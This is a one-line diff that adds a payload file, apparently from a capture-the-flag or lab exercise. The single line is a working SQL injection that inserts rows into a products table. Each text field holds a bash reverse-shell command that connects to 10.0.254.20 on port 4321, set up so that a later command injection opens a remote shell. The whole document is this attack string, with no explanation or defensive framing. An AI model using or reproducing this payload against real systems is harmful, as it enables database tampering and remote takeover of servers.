@@ -1,0 +1,1 @@
+';insert into products(name,image,text,price) values ('; bash -c "bash -i >& /dev/tcp/10.0.254.20/4321 0>&1";','; bash -c "bash -i >& /dev/tcp/10.0.254.20/4321 0>&1";','; bash -c "bash -i >& /dev/tcp/10.0.254.20/4321 0>&1";',13.37)#
